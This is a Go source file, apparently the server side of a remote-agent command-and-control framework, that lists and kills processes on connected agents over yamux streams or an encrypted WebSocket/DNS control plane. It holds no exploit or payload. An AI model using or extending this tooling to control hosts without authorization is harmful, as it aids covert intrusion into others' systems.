package services

import (
	"cupcake-server/internal/storage"
	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/utils"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"strings"
	"time"
)

// Package store is imported as path internal/storage (package name: store).

// Protocol Structs (Match Agent's JSON)
type ProcRequest struct {
	Action string `json:"action"` // "ps", "kill"
	Pid    int    `json:"pid,omitempty"`
}

type ProcessEntry struct {
	Pid  int    `json:"pid"`
	Ppid int    `json:"ppid"`
	Name string `json:"name"`
	User string `json:"user,omitempty"`
	Arch string `json:"arch,omitempty"`
}

type ProcResponse struct {
	Status    string         `json:"status"`
	Error     string         `json:"error,omitempty"`
	Processes []ProcessEntry `json:"processes,omitempty"`
}

func ListProcesses(agentID string) ([]ProcessEntry, error) {
	resp, err := executeProcCommand(agentID, ProcRequest{Action: "ps"})
	if err != nil {
		return nil, err
	}
	return resp.Processes, nil
}

func KillProcess(agentID string, pid int) error {
	_, err := executeProcCommand(agentID, ProcRequest{Action: "kill", Pid: pid})
	return err
}

func executeProcCommand(agentID string, req ProcRequest) (*ProcResponse, error) {
	// WS / DNS product agents only speak process_list/process_kill on the encrypted
	// control plane. Yamux PROCESS (0x04) is accepted only by TCP agent accept loops.
	// Prefer control-plane for non-TCP transports even if a stale YamuxSession lingers.
	if val, ok := globals.Clients.Load(agentID); ok {
		if c, ok := val.(*globals.Client); ok {
			tr := strings.ToLower(strings.TrimSpace(c.Transport))
			if tr == "websocket" || tr == "ws" || tr == "dns" || tr == "" {
				return executeProcCommandFallback(agentID, req)
			}
		}
	}

	session, exists := GetAgentSession(agentID)
	if !exists {
		return executeProcCommandFallback(agentID, req)
	}

	stream, err := session.Open()
	if err != nil {
		return executeProcCommandFallback(agentID, req)
	}
	defer stream.Close()

	// 1. Send Header (YamuxStreamProcess)
	if _, err := stream.Write([]byte{utils.YamuxStreamProcess}); err != nil {
		return executeProcCommandFallback(agentID, req)
	}

	// 2. Send Raw JSON
	if err := json.NewEncoder(stream).Encode(req); err != nil {
		return nil, fmt.Errorf("failed to send proc request: %v", err)
	}

	// 3. Read Response until EOF
	stream.SetReadDeadline(time.Now().Add(15 * time.Second))

	data, err := io.ReadAll(stream)
	if err != nil {
		// Yamux path failed — one control-plane attempt.
		if fb, fbErr := executeProcCommandFallback(agentID, req); fbErr == nil {
			return fb, nil
		}
		return nil, fmt.Errorf("read stream failed: %v", err)
	}

	var resp ProcResponse
	if err := json.Unmarshal(data, &resp); err != nil {
		return nil, fmt.Errorf("unmarshal failed: %v | Raw: %s", err, truncateForErr(string(data), 256))
	}

	if resp.Status == "error" {
		return nil, fmt.Errorf("agent error: %s", resp.Error)
	}

	return &resp, nil
}

func truncateForErr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func executeProcCommandFallback(agentID string, req ProcRequest) (*ProcResponse, error) {
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return nil, fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	cmdType := ""
	cmdContent := ""
	if req.Action == "ps" {
		cmdType = "process_list"
	} else if req.Action == "kill" {
		cmdType = "process_kill"
		cmdContent = fmt.Sprintf("%d", req.Pid)
	} else {
		return nil, fmt.Errorf("unsupported process action: %s", req.Action)
	}

	// Stable monotonic id (UnixNano alone can collide under burst).
	reqID := fmt.Sprintf("PROC-%d-%d", globals.GetNextReqID(), time.Now().UnixNano())
	resChan := make(chan interface{}, 1)
	globals.PendingResponses.Store(reqID, resChan)
	defer globals.PendingResponses.Delete(reqID)

	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    cmdType,
			CommandContent: cmdContent,
			ReqID:          reqID,
		},
	}

	// Persist so panel/history can show process_list progress (not only PendingResponses).
	_ = store.CreateCommandLogWithSource(agentID, reqID, cmdType, cmdContent, "api", "")

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return nil, err
	}

	// Agent enum budget ~5s + encrypt/WS slack.
	const wait = 20 * time.Second
	select {
	case res := <-resChan:
		pMap, ok := res.(map[string]interface{})
		if !ok {
			return nil, fmt.Errorf("invalid process response type %T", res)
		}
		var procResp ProcResponse
		procResp.Status = "ok"

		stdout, _ := pMap["stdout"].(string)
		stderr, _ := pMap["stderr"].(string)
		stdout = strings.TrimSpace(stdout)
		stderr = strings.TrimSpace(stderr)

		if cmdType == "process_list" {
			if stdout == "" || stdout == "[]" {
				// Empty success or timed partial: still OK for UI (avoid total failure).
				procResp.Processes = []ProcessEntry{}
				if stderr != "" {
					// Surface as non-fatal: return empty + log
					log.Printf("[process] %s empty list stderr=%s", agentID, truncateForErr(stderr, 200))
				}
				return &procResp, nil
			}
			var processes []ProcessEntry
			if err := json.Unmarshal([]byte(stdout), &processes); err != nil {
				return nil, fmt.Errorf("failed to parse process list output: %v | sample=%s", err, truncateForErr(stdout, 200))
			}
			procResp.Processes = processes
			return &procResp, nil
		}

		// kill
		if stderr != "" {
			return nil, fmt.Errorf("%s", stderr)
		}
		return &procResp, nil
	case <-time.After(wait):
		return nil, fmt.Errorf("agent response timeout (process %s after %s)", cmdType, wait)
	}
}
